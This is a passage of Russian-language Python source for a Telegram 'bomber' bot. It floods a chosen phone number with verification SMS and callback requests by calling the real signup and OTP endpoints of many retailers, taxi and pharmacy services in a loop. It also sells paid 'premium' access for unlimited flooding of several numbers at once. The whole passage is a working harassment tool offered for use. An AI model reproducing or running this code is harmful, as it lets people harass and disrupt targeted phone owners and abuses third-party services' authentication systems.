            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                          data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            print('[+] taxi-ritm отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            print('[+] Fix-Price отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[+] Iqos отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
            print('[+] KFC отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                          data={"action": "callback_phonenumber", "phone": _phone})
            print('[+] tarantino-family отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://apteka.ru/_action/auth/getForm/',
                          data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                                "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                                "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                                "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                                "utc_offset": "120", })
            print('[+] Apteka отправлено!')
            time.sleep(2.5)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            print('[+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                          json={"phone": _phone, "otpId": 0})
            print('[+] Ozon отправлен!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            iteration += 1
            print(('{} Loop Done.').format(iteration))
        except:
            break


def start_spam(chat_id, phone_number, force):
    global msg
    running_spams_per_chat_id.append(chat_id)

    with open("premium.txt") as file:
        arrayBL = [row.strip() for row in file]
        iduser = f'{chat_id}'
    if iduser not in arrayBL:
        bot.send_message(chat_id, "У вас нет премиума \n За покупкой - @viannedi", parse_mode="HTML")
    else:
        msg = f'‍Номер телефона: {phone_number}\nТаймер: ~Бесконечно\nСпам успешно начался!'

    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes=5)
    while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
    THREADS_AMOUNT[0] -= 10  # стояло 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass

def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id,
                         'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Остановить спам и поробуйте снова')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут.')
        print('Максимальное количество тредов исполняется. Действие отменено.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    global text
    chat_id = int(message.chat.id)
    text = message.text

    if text == 'пакпкп':
        bot.send_message(chat_id,
                         '❤️Возникли проблемы? - @viannedi \n Чат элиты - @VV2_Chat \n Так же спасибо \n @artem7, @crinny',
                         parse_mode='HTML')

    elif text == 'Бомбер':
        bot.send_message(chat_id,
                         'Для начала спама - ведите номер с кодом страны\n Без +')

    elif text == 'Рассылка' and chat_id == ADMIN_CHAT_ID:
        bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

    elif text == 'Соглашение':

        bot.send_message(chat_id,
                         'Проходя регестрацию в боте вы соглашаетесь с данными правилами! - https://telegra.ph/FAQ-02-02-5')

    elif text == 'Отключить':
        if chat_id not in running_spams_per_chat_id:
            bot.send_message(chat_id, 'Вы еще не начинали спам')
        else:
            running_spams_per_chat_id.remove(chat_id)
            bot.send_message(chat_id, 'Спам на номер завершен!')
    elif text == 'Премиум':
        markup = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton("Купить премиум", callback_data='good', url='https://qiwi.me/viannedi')

        markup.add(item1)
        bot.send_message(chat_id,
                         f'❤ Премиум доступ только СЕГОДНЯ - 45Р\n - 120 Сервисов \n Бесконечный флуд \n Доступ НАВСЕГДА \n Запускайте флуд сразу на 10 НОМЕРОВ\n 🙎За покупкой - @viannedi \n Или \n\n Перейдите по ссылке для оплаты \n❗️Обязательно введите коментарий: <code>{message.chat.id}</code>',
                         parse_mode='html', reply_markup=markup)


    elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID:
        msg = text.replace("РАЗОСЛАТЬ: ", "")
        send_message_users(msg)

    elif let == 1:
        text = message.text
        check = text.isdigit()

        if check == False:
            pass
        elif len(text) == 11:
            phone = text
            spam_handler(phone, chat_id, force=False)
        elif len(text) == 12:
            phone = text
            spam_handler(phone, chat_id, force=False)
        elif len(text) == 12 and chat_id == ADMIN_CHAT_ID and text[0] == '_':
            phone = text[1:]
            spam_handler(phone, chat_id, force=True)
        else:
            bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
            print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')


if __name__ == '__main__':
    bot.polling(none_stop=True)
